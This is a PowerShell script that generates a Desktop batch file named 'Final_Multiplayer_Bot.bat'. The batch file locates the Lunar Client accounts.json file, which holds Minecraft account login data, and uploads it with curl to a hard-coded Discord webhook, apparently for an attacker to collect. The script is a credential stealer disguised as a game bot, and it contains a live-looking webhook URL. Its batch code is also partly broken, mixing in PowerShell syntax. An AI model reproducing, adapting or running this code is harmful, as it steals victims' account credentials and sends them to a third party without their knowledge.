# 1. Define paths
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFileToRun = Join-Path $desktopPath 'run_bot.bat'
$destinationFile = Join-Path $desktopPath 'Final_Multiplayer_Bot.bat'

# 2. Create the Content
$scriptContent = @"
@echo off
title Discord Webhook Sender

:: Your Webhook URL
set webhookUrl=https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX

:: Path to file
set filePath=%USERPROFILE%\.lunarclient\settings\game\accounts.json

echo Checking for file...
if not exist "%filePath%" (
    echo ERROR: File not found!
    pause
    exit /b
)

echo File found. Sending...

:: Use curl
$payload = '{
  "content": "Here you go king :pray:",
  "embeds": []
}'

curl.exe -X POST %webhookUrl% ^
    -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" ^
    -F "payload_json=%payload%" ^
    -F "file=@%filePath%"

echo.
echo Webhook send finished.
pause
"@

# 3. Save to Desktop
$scriptContent | Out-File -FilePath $destinationFile -Encoding UTF8

Write-Host "Batch file created at: $destinationFile"
Write-Host "File is ready to run."
Write-Host "Press any key to open the folder..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

# 4. Open the folder to help you find it
explorer $desktopPath
